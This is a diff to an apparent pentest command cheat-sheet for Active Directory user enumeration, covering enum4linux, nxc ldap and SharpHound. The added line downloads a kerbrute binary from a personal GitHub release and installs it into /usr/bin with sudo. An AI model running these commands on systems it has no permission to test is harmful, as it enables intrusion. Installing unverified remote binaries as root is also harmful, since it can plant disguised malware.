@@ -621,6 +621,7 @@ EOF
       { cmd: 'enum4linux -U {TARGET} | grep "user:" | cut -f2 -d"[" | cut -f1 -d "]" > users.txt', category: 'userenum' },
       { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' --query "(sAMAccountName=*)" ""`, category: 'userenum' },
       { cmd: '.\\SharpHound.exe -c All', category: 'userenum' },
+      { cmd: `wget https://github.com/boboaung1337/again/releases/download/v0/kerbrute && sudo mv kerbrute /usr/bin/kerbrute && sudo chmod +x /usr/bin/kerbrute`, category: 'userenum' },
 
 
 
